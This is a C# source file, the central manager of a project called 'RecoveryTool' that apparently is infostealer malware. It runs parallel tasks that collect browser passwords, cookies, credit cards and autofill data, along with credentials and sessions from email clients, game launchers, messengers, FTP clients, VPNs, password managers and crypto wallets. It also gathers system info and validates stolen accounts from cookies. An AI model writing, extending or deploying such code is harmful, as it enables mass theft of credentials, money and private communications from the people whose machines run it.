using RecoveryTool.Recovery.System.FTPClients;
using RecoveryTool.Recovery.Browsers.Chromium;
using RecoveryTool.Recovery.Messenger.Jabber;
using RecoveryTool.Recovery.Browsers.Gecko;
using RecoveryTool.Recovery.Gaming.Games;
using RecoveryTool.Recovery.EmailClients;
using RecoveryTool.Recovery.Messenger;
using RecoveryTool.Recovery.Wallets;
using RecoveryTool.Recovery.Gaming;
using RecoveryTool.Recovery.System;
using RecoveryTool.Recovery.Other;
using RecoveryTool.Recovery.VPNs;
using RecoveryTool.Recovery.Browsers;

namespace RecoveryTool.Recovery
{
    public static class RecoveryManager
    {
        public static async Task RecoverForAllAsync()
        {
            List<Task> recoveryTasks = [];

            foreach (var browser in ChromiumCommon.BrowserDirectories)
            {
                recoveryTasks.Add(ChromiumPasswords.RecoverAsync(browser.Key, browser.Value));
                recoveryTasks.Add(ChromiumBookmarks.RecoverAsync(browser.Key, browser.Value));
                recoveryTasks.Add(ChromiumHistory.RecoverAsync(browser.Key, browser.Value));
                recoveryTasks.Add(ChromiumCreditCards.RecoverAsync(browser.Key, browser.Value));
                recoveryTasks.Add(ChromiumAutofill.RecoverAsync(browser.Key, browser.Value));
                recoveryTasks.Add(ChromiumCookies.RecoverAsync(browser.Key, browser.Value));
            }

            foreach (var browser in GeckoCommon.BrowserDirectories)
            {
                recoveryTasks.Add(GeckoPasswords.RecoverAsync(browser.Key, browser.Value));
                recoveryTasks.Add(GeckoHistory.RecoverAsync(browser.Key, browser.Value));
                recoveryTasks.Add(GeckoBookmarks.RecoverAsync(browser.Key, browser.Value));
                recoveryTasks.Add(GeckoAutofill.RecoverAsync(browser.Key, browser.Value));
                recoveryTasks.Add(GeckoCreditCards.RecoverAsync(browser.Key, browser.Value));
                recoveryTasks.Add(GeckoCookies.RecoverAsync(browser.Key, browser.Value));
            }

            recoveryTasks.Add(Task.Run(() => FoxMailService.SaveFoxMailAsync()));
            recoveryTasks.Add(Task.Run(() => MailbirdService.SaveMailbirdAsync()));
            recoveryTasks.Add(Task.Run(() => OutlookService.SaveOutlookAsync()));
            recoveryTasks.Add(Task.Run(() => ThunderbirdService.SaveThunderbirdAsync()));

            recoveryTasks.Add(Task.Run(() => MinecraftService.SaveMinecraftAsync()));
            recoveryTasks.Add(Task.Run(() => GrowtopiaService.SaveGrowtopiaAsync()));
            recoveryTasks.Add(Task.Run(() => RobloxService.SaveRobloxAsync()));
            recoveryTasks.Add(Task.Run(() => GamingService.SaveBattleNetAsync()));
            recoveryTasks.Add(Task.Run(() => GamingService.SaveEaAsync()));
            recoveryTasks.Add(Task.Run(() => GamingService.SaveEpicGamesAsync()));
            recoveryTasks.Add(Task.Run(() => GamingService.SaveSteamAsync()));
            recoveryTasks.Add(Task.Run(() => GamingService.SaveUbisoftAsync()));

            recoveryTasks.Add(Task.Run(() => PidginService.SavePidginAsync()));
            recoveryTasks.Add(Task.Run(() => PsiService.SavePsiAsync()));
            recoveryTasks.Add(Task.Run(() => DiscordService.SaveDiscordAsync()));
            recoveryTasks.Add(Task.Run(() => TelegramService.StartTelegramAsync()));
            recoveryTasks.Add(Task.Run(() => SlackService.SaveSlackAsync()));
            recoveryTasks.Add(Task.Run(() => ElementService.SaveElementAsync()));
            recoveryTasks.Add(Task.Run(() => IcqService.SaveICQAsync()));
            recoveryTasks.Add(Task.Run(() => SignalService.SaveSignalAsync()));
            recoveryTasks.Add(Task.Run(() => ViberService.SaveViberAsync()));
            recoveryTasks.Add(Task.Run(() => WhatsAppService.SaveWhatsAppAsync()));
            recoveryTasks.Add(Task.Run(() => SkypeService.SaveSkypeAsync()));
            recoveryTasks.Add(Task.Run(() => ToxService.SaveToxAsync()));
            recoveryTasks.Add(Task.Run(() => BrowserPasswordManagerService.SaveBrowserPasswordManagerAsync()));
            recoveryTasks.Add(Task.Run(() => PasswordManagerService.SavePasswordManagerAsync()));

            recoveryTasks.Add(Task.Run(() => CyberduckService.SaveCyberduckAsync()));
            recoveryTasks.Add(Task.Run(() => FileZillaService.SaveFileZillaAsync()));
            recoveryTasks.Add(Task.Run(() => WinSCPService.SaveWinscpAsync()));
            recoveryTasks.Add(Task.Run(() => HardwareInfo.SaveHardwareInfoAsync()));
            recoveryTasks.Add(Task.Run(() => HardwareInfo.SaveHardwareAndNetworkInfoAsync()));
            recoveryTasks.Add(Task.Run(() => HardwareInfo.SaveSoftwareAndUpdatesInfoAsync()));
            recoveryTasks.Add(Task.Run(() => FileRecoveryService.SaveFileRecoveryAsync()));

            recoveryTasks.Add(Task.Run(() => NordVPNService.SaveNordVPNAsync()));
            recoveryTasks.Add(Task.Run(() => OpenVPNService.SaveOpenVPNAsync()));
            recoveryTasks.Add(Task.Run(() => ProtonVPNService.SaveProtonVPNAsync()));
            recoveryTasks.Add(Task.Run(() => SharkVPNService.SaveSharkVPNAsync()));

            recoveryTasks.Add(Task.Run(() => CryptoWalletService.SaveCryptoAsync()));
            recoveryTasks.Add(Task.Run(() => AccountValidation.ValidateAccountsFromCookiesAsync()));

            await Task.WhenAll(recoveryTasks);
            GeckoCommon.ShutdownNss();
            await GeckoCommon.CleanupTempFilesAsync();
        }
    }
}